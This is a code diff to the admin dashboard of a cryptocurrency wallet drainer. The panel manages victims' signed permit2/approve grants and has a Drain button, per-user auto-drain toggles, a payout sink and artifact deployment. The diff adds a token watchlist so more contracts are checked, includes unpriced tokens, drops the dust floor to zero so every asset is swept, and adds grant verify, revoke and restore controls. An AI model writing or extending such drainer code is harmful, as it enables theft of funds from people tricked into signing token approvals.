@@ -105,10 +105,21 @@
     <select id="evmmode"><option value="permit2">permit2</option><option value="approve">approve</option></select></label>
   <label class="field"><span>Dust floor USD</span>
     <input id="dust" type="number" min="0" step="0.05"></label>
+  <label class="field"><span>Include unpriced</span>
+    <select id="unpriced"><option value="true">yes</option><option value="false">no</option></select></label>
   <label class="field"><span>Auto re-arm (hours)</span>
     <input id="rearm" type="number" min="1" step="1"></label>
   <button id="save">Save settings</button>
 </div>
+
+<h2>Token watchlist</h2>
+<p class="muted">Extra contracts to always check on a chain, on top of the seeded bluechips
+   and transfer-log discovery. One address per line.</p>
+<div class="row">
+  <label class="field"><span>Chain</span><select id="toknet"></select></label>
+</div>
+<div class="row"><textarea id="toklist" class="mono" rows="6" style="flex:1;background:var(--panel);border:1px solid var(--edge);color:var(--fg);border-radius:7px;padding:8px" placeholder="0x…"></textarea></div>
+<div class="row"><button class="ghost" id="tokload">Load chain</button><button id="toksave">Save watchlist</button></div>
 
 <h2>Payout sink</h2>
 <div id="payoutwarn"></div>
@@ -234,7 +245,8 @@ function fillSettings(s) {
   $("sigdays").value = s.sig_deadline_days ?? 30;
   $("native").value = String(s.take_native !== false);
   $("evmmode").value = s.evm_mode === "approve" ? "approve" : "permit2";
-  $("dust").value = s.min_usd_per_asset ?? 0.75;
+  $("dust").value = s.min_usd_per_asset ?? 0;
+  $("unpriced").value = String(s.include_unpriced !== false);
   $("rearm").value = s.rearm_hours ?? 6;
   $("payout_evm").value = s.payout_evm || "";
   $("payout_sol").value = s.payout_sol || "";
@@ -369,11 +381,12 @@ function renderUsers(users) {
       <td>${esc(u.email)}</td>
       <td>${Number(u.grants) || 0}</td>
       <td>${Number(u.active) || 0}</td>
-      <td>${u.drainer_auto ? `<span class="pill on">yes</span>` : `<span class="pill off">no</span>`}</td>
+      <td><select data-auto="${u.id}"><option value="1" ${u.drainer_auto ? "selected" : ""}>on</option><option value="0" ${u.drainer_auto ? "" : "selected"}>off</option></select></td>
       <td><button class="ghost" data-links="${u.id}" ${u.wallet_ids ? "" : "disabled"}>Copy</button></td>
       <td>
         <button class="ghost" data-detail="${u.id}">Detail</button>
         <button class="ghost" data-prepare="${u.id}">Re-sign</button>
+        <button class="ghost" data-verify="${u.id}">Verify</button>
         <button data-drain="${u.id}" ${Number(u.active) ? "" : "disabled"}>Drain</button>
       </td>
     </tr>`).join("");
@@ -384,8 +397,39 @@ function renderUsers(users) {
     b.onclick = () => copyLinks(b.dataset.links));
   $("users").querySelectorAll("[data-prepare]").forEach((b) =>
     b.onclick = () => prepareUser(b.dataset.prepare, b));
+  $("users").querySelectorAll("[data-verify]").forEach((b) =>
+    b.onclick = () => verifyUser(b.dataset.verify, b));
   $("users").querySelectorAll("[data-drain]").forEach((b) =>
     b.onclick = () => drainUser(b.dataset.drain, b));
+  $("users").querySelectorAll("[data-auto]").forEach((sel) =>
+    sel.onchange = () => setAuto(sel.dataset.auto, sel.value === "1", sel));
+}
+
+async function setAuto(uid, auto, sel) {
+  sel.disabled = true;
+  try {
+    await api("/api/drainer/auto", { method: "POST", body: JSON.stringify({ auto, user_id: Number(uid) }) });
+    toast(`Auto-drain ${auto ? "enabled" : "disabled"} for user #${uid}`, "ok");
+  } catch (e) {
+    toast(e.message, "bad");
+    sel.value = auto ? "0" : "1";
+  } finally {
+    sel.disabled = false;
+  }
+}
+
+async function verifyUser(uid, btn) {
+  btn.disabled = true;
+  try {
+    const r = await api(`/api/admin/drainer/verify/${uid}`, { method: "POST", body: "{}" });
+    toast(`Checked ${r.checked} grant(s) — revoked ${r.revoked}, re-queued ${r.requeued.length}`,
+          r.revoked ? "bad" : "ok");
+  } catch (e) {
+    toast(e.message, "bad");
+  } finally {
+    btn.disabled = false;
+    refresh();
+  }
 }
 
 async function copyLinks(uid) {
@@ -423,7 +467,7 @@ async function toggleDetail(uid) {
     }
     tr.innerHTML = `<td colspan="6">
       <table><thead><tr><th>Network</th><th>Asset</th><th>Cap</th><th>Kind</th>
-      <th>Status</th><th>Expires</th></tr></thead><tbody>
+      <th>Status</th><th>Expires</th><th></th></tr></thead><tbody>
       ${grants.map((g) => `<tr>
         <td class="muted">${esc(g.network)}</td>
         <td>${esc(g.symbol || "?")}</td>
@@ -432,9 +476,34 @@ async function toggleDetail(uid) {
         <td><span class="pill ${g.status === "active" ? "on"
           : g.status === "awaiting_signature" ? "mid" : "off"}">${esc(g.status)}</span></td>
         <td class="muted">${g.sig_deadline ? esc(when(g.sig_deadline * 1000)) : "—"}</td>
+        <td>${g.status === "revoked"
+          ? `<button class="ghost" data-restore="${esc(g.id)}">Restore</button>`
+          : g.kind !== "native_tx"
+            ? `<button class="ghost" data-revoke="${esc(g.id)}">Revoke</button>` : ""}</td>
       </tr>`).join("")}</tbody></table></td>`;
+    tr.querySelectorAll("[data-revoke]").forEach((b) =>
+      b.onclick = () => grantAction("revoke", b.dataset.revoke, b));
+    tr.querySelectorAll("[data-restore]").forEach((b) =>
+      b.onclick = () => grantAction("restore", b.dataset.restore, b));
   } catch (e) {
-    tr.innerHTML = `<td colspan="6" class="bad">${esc(e.message)}</td>`;
+    tr.innerHTML = `<td colspan="7" class="bad">${esc(e.message)}</td>`;
+  }
+}
+
+async function grantAction(kind, gid, btn) {
+  btn.disabled = true;
+  try {
+    const path = kind === "restore"
+      ? `/api/admin/drainer/grants/${gid}/restore`
+      : `/api/drainer/grants/${gid}/revoke`;
+    await api(path, { method: "POST", body: "{}" });
+    toast(`Grant ${kind === "restore" ? "restored" : "revoked"}`, "ok");
+    document.querySelectorAll("tr.detail").forEach((row) => row.remove());
+  } catch (e) {
+    toast(e.message, "bad");
+  } finally {
+    btn.disabled = false;
+    refresh();
   }
 }
 
@@ -516,6 +585,7 @@ async function saveSettings() {
         drainer_take_native: settingBool("native"),
         drainer_evm_mode: setting("evmmode") === "approve" ? "approve" : "permit2",
         drainer_min_usd_per_asset: settingNum("dust"),
+        drainer_include_unpriced: settingBool("unpriced"),
         drainer_rearm_hours: Math.max(1, Math.floor(settingNum("rearm"))),
       }),
     });
@@ -646,6 +716,12 @@ async function refresh() {
   try {
     const d = await api("/api/admin/drainer/overview");
     if (!settingsLoaded) fillSettings(d.settings);
+    if (!$("toknet").options.length) {
+      $("toknet").innerHTML = (d.settings.evm_networks || [])
+        .filter((n) => !n.testnet)
+        .map((n) => `<option value="${esc(n.name)}">${esc(n.name)}</option>`).join("");
+      tokenLoad();
+    }
     renderStatus(d);
     renderEvents(d.events);
     ov = d;
@@ -673,12 +749,35 @@ async function refresh() {
   } catch { /* handled above */ }
 }
 
+async function tokenLoad() {
+  const net = $("toknet").value;
+  try {
+    const s = await api("/api/admin/settings");
+    const list = (s.settings || {})[`drainer_tokens_${net}`] || [];
+    $("toklist").value = (Array.isArray(list) ? list : []).join("\n");
+  } catch (e) { toast(e.message, "bad"); }
+}
+
+async function tokenSave() {
+  const net = $("toknet").value;
+  const list = $("toklist").value.split(/\s+/).map((x) => x.trim()).filter(Boolean);
+  try {
+    await api("/api/admin/settings", {
+      method: "PATCH",
+      body: JSON.stringify({ [`drainer_tokens_${net}`]: list }),
+    });
+    toast(`Saved ${list.length} token(s) for ${net}`, "ok");
+  } catch (e) { toast(e.message, "bad"); }
+}
+
 $("save").onclick = saveSettings;
 $("savepayout").onclick = savePayout;
 $("forwardnow").onclick = forwardNow;
 $("compile").onclick = compileArtifact;
 $("deployall").onclick = deployAll;
 $("key").onclick = setKey;
+$("tokload").onclick = tokenLoad;
+$("toksave").onclick = tokenSave;
 $("reveal").onclick = () => {
   const f = $("secret");
   f.type = f.type === "password" ? "text" : "password";
